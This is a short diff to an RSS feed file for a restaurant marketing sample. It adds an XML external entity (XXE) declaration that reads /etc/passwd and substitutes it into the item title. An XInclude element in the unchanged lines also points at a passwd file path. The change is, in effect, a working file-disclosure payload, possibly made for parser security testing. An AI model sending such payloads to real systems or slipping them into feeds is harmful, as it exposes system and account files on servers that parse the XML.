@@ -1,10 +1,11 @@
 <?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
 <rss version="2.0">
 <foo xmlns:xi="http://www.w3.org/2001/XInclude">
 <xi:include parse="text" href="file:///ect/passwd"/></foo> 
   <channel>
     <item>
-      <title>RSS Solutions for Restaurants</title>
+      <title>&xxe;</title>
       <description>&lt;b&gt;FeedForAll &lt;/b&gt;helps Restaurant&apos;s communicate with customers. Let your customers know the latest specials or events.&lt;br&gt;
 &lt;br&gt;
 RSS feed uses include:&lt;br&gt;
